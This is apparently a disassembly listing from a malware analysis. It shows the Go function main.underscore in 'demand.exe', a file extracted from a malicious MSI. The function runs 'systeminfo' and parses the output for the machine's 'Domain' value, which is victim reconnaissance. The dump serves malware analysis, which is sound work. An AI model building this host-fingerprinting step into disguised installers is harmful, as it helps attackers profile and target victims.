
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

00000001402755c0 <.text+0x2745c0>:
   1402755c0 <main.underscore>:	4c 8d 64 24 c0       	lea    r12,[rsp-0x40]
   1402755c5:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   1402755c9:	0f 86 4f 03 00 00    	jbe    0x14027591e
   1402755cf:	55                   	push   rbp
   1402755d0:	48 89 e5             	mov    rbp,rsp
   1402755d3:	48 81 ec b8 00 00 00 	sub    rsp,0xb8
   1402755da:	48 8d 05 12 09 0f 00 	lea    rax,[rip+0xf0912]        # 0x140365ef3 'systeminfo for type   netGo = .localhostsetsockoptgetsockoptIP addressunixpacketexecerrdotSYSTEMROOT'
   1402755e1:	bb 0a 00 00 00       	mov    ebx,0xa
   1402755e6:	31 c9                	xor    ecx,ecx
   1402755e8:	31 ff                	xor    edi,edi
   1402755ea:	48 89 fe             	mov    rsi,rdi
   1402755ed:	e8 6e 15 ed ff       	call   0x140146b60 <os/exec.Command>
   1402755f2:	48 89 44 24 60       	mov    QWORD PTR [rsp+0x60],rax
   1402755f7:	48 8d 05 42 b7 0b 00 	lea    rax,[rip+0xbb742]        # 0x140330d40 '(\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xae\x02\\xcfi\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\x9c\\x8c\x00\x00@i\x08\x00\x10\r-@\x01\x00\x00\x00\\xa0\r3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x10\r\x00\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x009\x02-@'
   1402755fe:	66 90                	xchg   ax,ax
   140275600:	e8 fb 0d da ff       	call   0x140016400 <runtime.newobject>
   140275605:	48 89 84 24 a8 00 00 	mov    QWORD PTR [rsp+0xa8],rax
   14027560c:	00 
   14027560d:	48 8d 05 2c b7 0b 00 	lea    rax,[rip+0xbb72c]        # 0x140330d40 '(\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xae\x02\\xcfi\x07\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00H >@\x01\x00\x00\x00\\x9c\\x8c\x00\x00@i\x08\x00\x10\r-@\x01\x00\x00\x00\\xa0\r3@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x10\r\x00\x00\x00\x00\x00\x00X\x00\x00\x00\x00\x00\x00\x009\x02-@'
   140275614:	e8 e7 0d da ff       	call   0x140016400 <runtime.newobject>
   140275619:	48 8d 15 00 06 17 00 	lea    rdx,[rip+0x170600]        # 0x1403e5c20 '@\\xb30@\x01\x00\x00\x00@i5@\x01\x00\x00\x00<\x10\x1b.\x00\x00\x00\x00\\x80\x15\x0f@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00 @0@\x01\x00\x00\x00\\xa0\\xd23\\x8f\x00\x00\x00\x00\\xe0,\x08@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\\xe0\\xc35@\x01\x00\x00\x00Z\\xdd\x11\\x9f\x00\x00\x00\x00`\\xa4\r@\x01\x00\x00\x00\\xc0\\xdc0@'
   140275620:	4c 8b 44 24 60       	mov    r8,QWORD PTR [rsp+0x60]
   140275625:	49 89 50 60          	mov    QWORD PTR [r8+0x60],rdx
   140275629:	83 3d 90 27 3e 00 00 	cmp    DWORD PTR [rip+0x3e2790],0x0        # 0x140657dc0 ''
   140275630:	75 0a                	jne    0x14027563c
   140275632:	48 8b b4 24 a8 00 00 	mov    rsi,QWORD PTR [rsp+0xa8]
   140275639:	00 
   14027563a:	eb 24                	jmp    0x140275660
   14027563c:	49 8b 48 68          	mov    rcx,QWORD PTR [r8+0x68]
   140275640:	49 8b 58 78          	mov    rbx,QWORD PTR [r8+0x78]
   140275644:	e8 37 52 e0 ff       	call   0x14007a880 <runtime.gcWriteBarrier4>
   140275649:	48 8b b4 24 a8 00 00 	mov    rsi,QWORD PTR [rsp+0xa8]
   140275650:	00 
   140275651:	49 89 33             	mov    QWORD PTR [r11],rsi
   140275654:	49 89 4b 08          	mov    QWORD PTR [r11+0x8],rcx
   140275658:	49 89 43 10          	mov    QWORD PTR [r11+0x10],rax
   14027565c:	49 89 5b 18          	mov    QWORD PTR [r11+0x18],rbx
   140275660:	48 89 84 24 b0 00 00 	mov    QWORD PTR [rsp+0xb0],rax
   140275667:	00 
   140275668:	49 89 70 68          	mov    QWORD PTR [r8+0x68],rsi
   14027566c:	49 89 50 70          	mov    QWORD PTR [r8+0x70],rdx
   140275670:	49 89 40 78          	mov    QWORD PTR [r8+0x78],rax
   140275674:	4c 89 c0             	mov    rax,r8
   140275677:	e8 44 2a ed ff       	call   0x1401480c0 <os/exec.(*Cmd).Run>
   14027567c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140275680:	48 85 c0             	test   rax,rax
   140275683:	75 77                	jne    0x1402756fc
   140275685:	48 8b 94 24 a8 00 00 	mov    rdx,QWORD PTR [rsp+0xa8]
   14027568c:	00 
   14027568d:	48 85 d2             	test   rdx,rdx
   140275690:	74 3b                	je     0x1402756cd
   140275692:	48 8b 4a 08          	mov    rcx,QWORD PTR [rdx+0x8]
   140275696:	48 8b 42 18          	mov    rax,QWORD PTR [rdx+0x18]
   14027569a:	66 0f 1f 44 00 00    	nop    WORD PTR [rax+rax*1+0x0]
   1402756a0:	48 39 c1             	cmp    rcx,rax
   1402756a3:	0f 82 6f 02 00 00    	jb     0x140275918
   1402756a9:	48 8b 32             	mov    rsi,QWORD PTR [rdx]
   1402756ac:	48 8b 52 10          	mov    rdx,QWORD PTR [rdx+0x10]
   1402756b0:	48 89 c7             	mov    rdi,rax
   1402756b3:	48 29 d0             	sub    rax,rdx
   1402756b6:	48 29 f9             	sub    rcx,rdi
   1402756b9:	48 c1 f8 3f          	sar    rax,0x3f
   1402756bd:	48 21 f8             	and    rax,rdi
   1402756c0:	48 8d 1c 06          	lea    rbx,[rsi+rax*1]
   1402756c4:	31 c0                	xor    eax,eax
   1402756c6:	e8 b5 4e de ff       	call   0x14005a580 <runtime.slicebytetostring>
   1402756cb:	eb 0c                	jmp    0x1402756d9
   1402756cd:	bb 05 00 00 00       	mov    ebx,0x5
   1402756d2:	48 8d 05 27 f7 0e 00 	lea    rax,[rip+0xef727]        # 0x140364e00 '<nil>arrayfalsefileshttpsimap2imap3imapspop3shostswriteclosentohsMarchApril+0530+0430+0545+0630+0330'
   1402756d9:	48 8d 0d 80 c9 16 00 	lea    rcx,[rip+0x16c980]        # 0x1403e2060 '\n\x00\x00\x00\x00\x00\x00\x00J)\\xa5\\x94R\x00\x00\x00\\xa5\\x94RJ)\x00\x00\x002333\x01\x00\x00\x00\\x99\\x99\\x99\\x99\x00\x00\x00\x00\t\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\\xd8\x00\x00\x00\x00\x00\x00\x00\x18\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00:\x00\x00\x00\x00\x00\x00\x00[\x00\x00\x00'
   1402756e0:	bf 01 00 00 00       	mov    edi,0x1
   1402756e5:	31 f6                	xor    esi,esi
   1402756e7:	49 c7 c0 ff ff ff ff 	mov    r8,0xffffffffffffffff
   1402756ee:	e8 4d 93 e7 ff       	call   0x1400eea40 <strings.genSplit>
   1402756f3:	31 c9                	xor    ecx,ecx
   1402756f5:	31 d2                	xor    edx,edx
   1402756f7:	e9 24 01 00 00       	jmp    0x140275820
   1402756fc:	48 89 5c 24 58       	mov    QWORD PTR [rsp+0x58],rbx
   140275701:	48 89 44 24 30       	mov    QWORD PTR [rsp+0x30],rax
   140275706:	48 8b 94 24 b0 00 00 	mov    rdx,QWORD PTR [rsp+0xb0]
   14027570d:	00 
   14027570e:	48 85 d2             	test   rdx,rdx
   140275711:	74 40                	je     0x140275753
   140275713:	48 8b 4a 08          	mov    rcx,QWORD PTR [rdx+0x8]
   140275717:	48 8b 72 18          	mov    rsi,QWORD PTR [rdx+0x18]
   14027571b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   140275720:	48 39 ce             	cmp    rsi,rcx
   140275723:	0f 87 c7 00 00 00    	ja     0x1402757f0
   140275729:	48 8b 3a             	mov    rdi,QWORD PTR [rdx]
   14027572c:	48 8b 52 10          	mov    rdx,QWORD PTR [rdx+0x10]
   140275730:	49 89 f0             	mov    r8,rsi
   140275733:	48 29 d6             	sub    rsi,rdx
   140275736:	4c 29 c1             	sub    rcx,r8
   140275739:	48 c1 fe 3f          	sar    rsi,0x3f
   14027573d:	4c 21 c6             	and    rsi,r8
   140275740:	48 8d 1c 37          	lea    rbx,[rdi+rsi*1]
   140275744:	31 c0                	xor    eax,eax
   140275746:	e8 35 4e de ff       	call   0x14005a580 <runtime.slicebytetostring>
   14027574b:	48 89 d9             	mov    rcx,rbx
   14027574e:	48 89 c2             	mov    rdx,rax
   140275751:	eb 0c                	jmp    0x14027575f
   140275753:	b9 05 00 00 00       	mov    ecx,0x5
   140275758:	48 8d 15 a1 f6 0e 00 	lea    rdx,[rip+0xef6a1]        # 0x140364e00 '<nil>arrayfalsefileshttpsimap2imap3imapspop3shostswriteclosentohsMarchApril+0530+0430+0545+0630+0330'
   14027575f:	48 89 d0             	mov    rax,rdx
   140275762:	48 89 cb             	mov    rbx,rcx
   140275765:	e8 76 ac e7 ff       	call   0x1400f03e0 <strings.TrimSpace>
   14027576a:	44 0f 11 bc 24 88 00 	movups XMMWORD PTR [rsp+0x88],xmm15
   140275771:	00 00 
   140275773:	44 0f 11 bc 24 98 00 	movups XMMWORD PTR [rsp+0x98],xmm15
   14027577a:	00 00 
   14027577c:	48 8b 4c 24 30       	mov    rcx,QWORD PTR [rsp+0x30]
   140275781:	48 85 c9             	test   rcx,rcx
   140275784:	74 04                	je     0x14027578a
   140275786:	48 8b 49 08          	mov    rcx,QWORD PTR [rcx+0x8]
   14027578a:	48 89 8c 24 88 00 00 	mov    QWORD PTR [rsp+0x88],rcx
   140275791:	00 
   140275792:	48 8b 4c 24 58       	mov    rcx,QWORD PTR [rsp+0x58]
   140275797:	48 89 8c 24 90 00 00 	mov    QWORD PTR [rsp+0x90],rcx
   14027579e:	00 
   14027579f:	90                   	nop
   1402757a0:	e8 9b ad df ff       	call   0x140070540 <runtime.convTstring>
   1402757a5:	48 8d 0d d4 fa 07 00 	lea    rcx,[rip+0x7fad4]        # 0x1402f5280 '\x10\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\\xb82\\x87\\xf8\x07\x08\x08\x18\\xa8I8@\x01\x00\x00\x00H >@\x01\x00\x00\x00\x03-\x00\x00@\\xbc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x004\x15%\\xbc\x0f\x01\x01\x03\\xb0I8@\x01\x00\x00\x00\\xe82>@'
   1402757ac:	48 89 8c 24 98 00 00 	mov    QWORD PTR [rsp+0x98],rcx
   1402757b3:	00 
   1402757b4:	48 89 84 24 a0 00 00 	mov    QWORD PTR [rsp+0xa0],rax
   1402757bb:	00 
   1402757bc:	48 8d 05 d5 78 0f 00 	lea    rax,[rip+0xf78d5]        # 0x14036d098 'systeminfo failed: %w: %scontext deadline exceededjson: Unexpected key typereflect.Value.OverflowInt'
   1402757c3:	bb 19 00 00 00       	mov    ebx,0x19
   1402757c8:	48 8d 8c 24 88 00 00 	lea    rcx,[rsp+0x88]
   1402757cf:	00 
   1402757d0:	bf 02 00 00 00       	mov    edi,0x2
   1402757d5:	48 89 fe             	mov    rsi,rdi
   1402757d8:	e8 e3 a9 e6 ff       	call   0x1400e01c0 <fmt.Errorf>
   1402757dd:	48 89 c1             	mov    rcx,rax
   1402757e0:	48 89 df             	mov    rdi,rbx
   1402757e3:	31 c0                	xor    eax,eax
   1402757e5:	31 db                	xor    ebx,ebx
   1402757e7:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
   1402757ee:	5d                   	pop    rbp
   1402757ef:	c3                   	ret
   1402757f0:	48 89 f0             	mov    rax,rsi
   1402757f3:	e8 a8 54 e0 ff       	call   0x14007aca0 <runtime.panicSliceB>
   1402757f8:	4c 8b 84 24 80 00 00 	mov    r8,QWORD PTR [rsp+0x80]
   1402757ff:	00 
   140275800:	49 83 c0 10          	add    r8,0x10
   140275804:	4c 8b 4c 24 50       	mov    r9,QWORD PTR [rsp+0x50]
   140275809:	49 ff c9             	dec    r9
   14027580c:	48 89 d9             	mov    rcx,rbx
   14027580f:	48 89 c2             	mov    rdx,rax
   140275812:	4c 89 cb             	mov    rbx,r9
   140275815:	4c 89 c0             	mov    rax,r8
   140275818:	0f 1f 84 00 00 00 00 	nop    DWORD PTR [rax+rax*1+0x0]
   14027581f:	00 
   140275820:	48 85 db             	test   rbx,rbx
   140275823:	0f 8e ac 00 00 00    	jle    0x1402758d5
   140275829:	48 89 54 24 70       	mov    QWORD PTR [rsp+0x70],rdx
   14027582e:	48 89 4c 24 40       	mov    QWORD PTR [rsp+0x40],rcx
   140275833:	48 89 5c 24 50       	mov    QWORD PTR [rsp+0x50],rbx
   140275838:	48 89 84 24 80 00 00 	mov    QWORD PTR [rsp+0x80],rax
   14027583f:	00 
   140275840:	48 8b 10             	mov    rdx,QWORD PTR [rax]
   140275843:	48 8b 58 08          	mov    rbx,QWORD PTR [rax+0x8]
   140275847:	90                   	nop
   140275848:	48 89 d0             	mov    rax,rdx
   14027584b:	48 8d 0d 66 c8 16 00 	lea    rcx,[rip+0x16c866]        # 0x1403e20b8 ':\x00\x00\x00\x00\x00\x00\x00[\x00\x00\x00\x00\x00\x00\x00"\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00V\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
   140275852:	bf 01 00 00 00       	mov    edi,0x1
   140275857:	e8 a4 51 d9 ff       	call   0x14000aa00 <internal/stringslite.Cut>
   14027585c:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140275860:	40 84 f6             	test   sil,sil
   140275863:	75 0c                	jne    0x140275871
   140275865:	48 8b 5c 24 40       	mov    rbx,QWORD PTR [rsp+0x40]
   14027586a:	48 8b 44 24 70       	mov    rax,QWORD PTR [rsp+0x70]
   14027586f:	eb 87                	jmp    0x1402757f8
   140275871:	48 89 4c 24 78       	mov    QWORD PTR [rsp+0x78],rcx
   140275876:	48 89 7c 24 48       	mov    QWORD PTR [rsp+0x48],rdi
   14027587b:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   140275880:	e8 5b ab e7 ff       	call   0x1400f03e0 <strings.TrimSpace>
   140275885:	48 89 5c 24 38       	mov    QWORD PTR [rsp+0x38],rbx
   14027588a:	48 89 44 24 68       	mov    QWORD PTR [rsp+0x68],rax
   14027588f:	48 8b 44 24 78       	mov    rax,QWORD PTR [rsp+0x78]
   140275894:	48 8b 5c 24 48       	mov    rbx,QWORD PTR [rsp+0x48]
   140275899:	e8 42 ab e7 ff       	call   0x1400f03e0 <strings.TrimSpace>
   14027589e:	48 8b 4c 24 38       	mov    rcx,QWORD PTR [rsp+0x38]
   1402758a3:	48 83 f9 06          	cmp    rcx,0x6
   1402758a7:	75 1d                	jne    0x1402758c6
   1402758a9:	48 8b 54 24 68       	mov    rdx,QWORD PTR [rsp+0x68]
   1402758ae:	81 3a 44 6f 6d 61    	cmp    DWORD PTR [rdx],0x616d6f44
   1402758b4:	75 10                	jne    0x1402758c6
   1402758b6:	66 81 7a 04 69 6e    	cmp    WORD PTR [rdx+0x4],0x6e69
   1402758bc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   1402758c0:	0f 84 32 ff ff ff    	je     0x1402757f8
   1402758c6:	48 8b 5c 24 40       	mov    rbx,QWORD PTR [rsp+0x40]
   1402758cb:	48 8b 44 24 70       	mov    rax,QWORD PTR [rsp+0x70]
   1402758d0:	e9 23 ff ff ff       	jmp    0x1402757f8
   1402758d5:	48 85 c9             	test   rcx,rcx
   1402758d8:	75 2b                	jne    0x140275905
   1402758da:	48 8d 05 07 02 0f 00 	lea    rax,[rip+0xf0207]        # 0x140365ae8 'not found of type omitemptyfiles,dnsdns,filesipv6-icmp_outboundlocalhostconnectex#execwaitinterruptb'
   1402758e1:	bb 09 00 00 00       	mov    ebx,0x9
   1402758e6:	31 c9                	xor    ecx,ecx
   1402758e8:	31 ff                	xor    edi,edi
   1402758ea:	48 89 fe             	mov    rsi,rdi
   1402758ed:	e8 ce a8 e6 ff       	call   0x1400e01c0 <fmt.Errorf>
   1402758f2:	48 89 c1             	mov    rcx,rax
   1402758f5:	48 89 df             	mov    rdi,rbx
   1402758f8:	31 c0                	xor    eax,eax
   1402758fa:	31 db                	xor    ebx,ebx
   1402758fc:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
   140275903:	5d                   	pop    rbp
   140275904:	c3                   	ret
   140275905:	48 89 d0             	mov    rax,rdx
   140275908:	48 89 cb             	mov    rbx,rcx
   14027590b:	31 c9                	xor    ecx,ecx
   14027590d:	31 ff                	xor    edi,edi
   14027590f:	48 81 c4 b8 00 00 00 	add    rsp,0xb8
   140275916:	5d                   	pop    rbp
   140275917:	c3                   	ret
   140275918:	e8 83 53 e0 ff       	call   0x14007aca0 <runtime.panicSliceB>
   14027591d:	90                   	nop
   14027591e:	66 90                	xchg   ax,ax
   140275920:	e8 fb 2f e0 ff       	call   0x140078920 <runtime.morestack_noctxt>
   140275925:	e9 96 fc ff ff       	jmp    0x1402755c0 <main.underscore>
   14027592a:	cc                   	int3
   14027592b:	cc                   	int3
   14027592c:	cc                   	int3
   14027592d:	cc                   	int3
   14027592e:	cc                   	int3
   14027592f:	cc                   	int3
   140275930:	cc                   	int3
   140275931:	cc                   	int3
   140275932:	cc                   	int3
   140275933:	cc                   	int3
   140275934:	cc                   	int3
   140275935:	cc                   	int3
   140275936:	cc                   	int3
   140275937:	cc                   	int3
   140275938:	cc                   	int3
   140275939:	cc                   	int3
   14027593a:	cc                   	int3
   14027593b:	cc                   	int3
   14027593c:	cc                   	int3
   14027593d:	cc                   	int3
   14027593e:	cc                   	int3
   14027593f:	cc                   	int3
